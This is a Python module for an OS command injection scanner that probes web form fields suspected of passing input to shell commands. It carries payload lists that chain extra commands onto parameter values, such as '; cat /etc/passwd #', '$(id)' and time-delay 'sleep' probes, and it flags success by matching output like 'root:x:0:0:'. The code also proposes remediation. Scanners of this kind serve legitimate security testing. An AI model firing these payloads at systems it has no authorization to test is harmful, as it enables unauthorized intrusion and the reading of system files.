#!/usr/bin/env python3
"""
OS Command Injection vulnerability scanner.
Tests for command injection vulnerabilities in web applications.

References:
    - OWASP: https://owasp.org/www-community/attacks/Command_Injection
    - CWE-78: Improper Neutralization of Special Elements used in an OS Command
"""

import re
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """OS Command Injection vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize command injection scanner.
        
        Args:
            browser: StealthBrowser instance
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "OS Command Injection"
        
        # Command injection payloads
        self.payloads = {
            'time_based': [
                '; sleep 5 #',
                '| sleep 5 #',
                '` sleep 5 `',
                '$(sleep 5)',
                '& sleep 5 &',
                '|| sleep 5',
                '&& sleep 5',
                '\n sleep 5 \n',
            ],
            'output_based': [
                '; id #',
                '| id #',
                '` id `',
                '$(id)',
                '& id &',
                '|| id',
                '&& id',
                '; cat /etc/passwd #',
                '| cat /etc/passwd #',
                '$(cat /etc/passwd)',
            ],
            'windows': [
                '| dir',
                '; dir',
                '& dir &',
                '&& dir',
                '|| dir',
                '| type C:\\windows\\win.ini',
                '$(dir)',
            ],
            'blind': [
                '; ping -c 5 127.0.0.1 #',
                '| ping -c 5 127.0.0.1 #',
                '` ping -c 5 127.0.0.1 `',
                '$(ping -c 5 127.0.0.1)',
            ],
        }
        
        # Output indicators
        self.output_indicators = {
            'linux': [
                'uid=', 'gid=', 'groups=',  # id command output
                'root:x:0:0:',              # /etc/passwd content
                'bin:x:',                   # /etc/passwd content
                'daemon:x:',                # /etc/passwd content
            ],
            'windows': [
                'Volume in drive',
                'Directory of',
                '[fonts]',                  # win.ini content
                '[extensions]',
            ],
        }
        
        # Common injection parameters
        self.injection_params = [
            'cmd', 'exec', 'command', 'execute', 'ping', 'query',
            'jump', 'code', 'reg', 'do', 'func', 'arg', 'option',
            'load', 'process', 'step', 'read', 'function', 'feature',
            'exe', 'module', 'parameter', 'action', 'run',
        ]
    
    def run(self) -> Dict:
        """
        Execute command injection tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} scan")
        
        result = {
            'module': self.module_name,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'findings': []
        }
        
        # Find testable parameters
        test_urls = self._discover_parameters()
        
        for url, params in test_urls:
            for param_name, param_value in params.items():
                result['parameters_tested'].append(f"{url}:{param_name}")
                
                is_vulnerable = self._test_parameter(url, param_name, params)
                
                if is_vulnerable:
                    result['vulnerable_parameters'].append({
                        'url': url,
                        'parameter': param_name,
                        'type': is_vulnerable['type'],
                        'evidence': is_vulnerable['evidence']
                    })
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            self.findings.append({
                'title': f"OS Command Injection in '{vuln['parameter']}' parameter",
                'severity': 'critical',
                'description': (
                    f"Command injection vulnerability detected in the '{vuln['parameter']}' "
                    f"parameter at {vuln['url']}. Type: {vuln['type']}. "
                    f"This allows remote code execution on the server."
                ),
                'recommendation': (
                    "1. Never pass user input directly to OS command execution functions\n"
                    "2. Use library functions instead of shell commands where possible\n"
                    "3. Validate and sanitize all user inputs\n"
                    "4. Use allowlists for allowed commands and arguments\n"
                    "5. Escape special shell characters\n"
                    "6. Run applications with minimal privileges"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-78',
                'cvss_score': 9.8,
                'evidence': vuln['evidence'],
                'references': [
                    'https://owasp.org/www-community/attacks/Command_Injection',
                    'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
                ]
            })
        
        result['findings'] = self.findings
        
        logger.info(f"{self.module_name} complete. Found {len(self.findings)} vulnerabilities")
        return result
    
    def _discover_parameters(self) -> List:
        """Discover parameters that might be vulnerable to command injection."""
        test_urls = []
        
        # Test main page
        resp = self.browser.get('/')
        if resp and resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                inputs = {}
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name', '')
                    if name:
                        # Check if parameter name suggests command execution
                        if any(inj_param in name.lower() for inj_param in self.injection_params):
                            inputs[name] = input_tag.get('value', 'test')
                
                if inputs:
                    form_url = urljoin(self.target_url, action) if action else resp.url
                    test_urls.append((form_url, inputs))
        
        return test_urls[:10]
    
    def _test_parameter(self, url: str, param_name: str, params: Dict) -> Optional[Dict]:
        """
        Test a parameter for command injection.
        
        Args:
            url: Target URL
            param_name: Parameter name
            params: All parameters
        
        Returns:
            Dict with vulnerability info or None
        """
        # Test 1: Time-based detection
        for payload in self.payloads['time_based'][:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            start_time = time.time()
            resp = self.browser.get(url, params=test_params)
            elapsed = time.time() - start_time
            
            if elapsed > 4:  # Response took more than 4 seconds
                logger.info(f"Time-based command injection found via {param_name}")
                return {
                    'type': 'time_based',
                    'evidence': f"Response delayed by {elapsed:.1f} seconds (expected ~5s)"
                }
        
        # Test 2: Output-based detection
        for payload in self.payloads['output_based'][:4]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.output_indicators['linux']:
                    if indicator in resp.text:
                        logger.info(f"Output-based command injection found via {param_name}")
                        return {
                            'type': 'output_based_linux',
                            'evidence': f"Response contains '{indicator}'"
                        }
        
        # Test 3: Windows-specific payloads
        for payload in self.payloads['windows'][:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in self.output_indicators['windows']:
                    if indicator in resp.text:
                        logger.info(f"Windows command injection found via {param_name}")
                        return {
                            'type': 'output_based_windows',
                            'evidence': f"Response contains '{indicator}'"
                        }
        
        # Test 4: Error-based detection
        error_payloads = [
            '; invalid_command_xyz 2>&1 #',
            '| invalid_command_xyz 2>&1 #',
            '$(invalid_command_xyz)',
        ]
        
        error_indicators = [
            'not found',
            'command not found',
            'is not recognized',
            'No such file',
        ]
        
        for payload in error_payloads[:2]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                for indicator in error_indicators:
                    if indicator in resp.text:
                        return {
                            'type': 'error_based',
                            'evidence': f"Response contains error: '{indicator}'"
                        }
        
        return None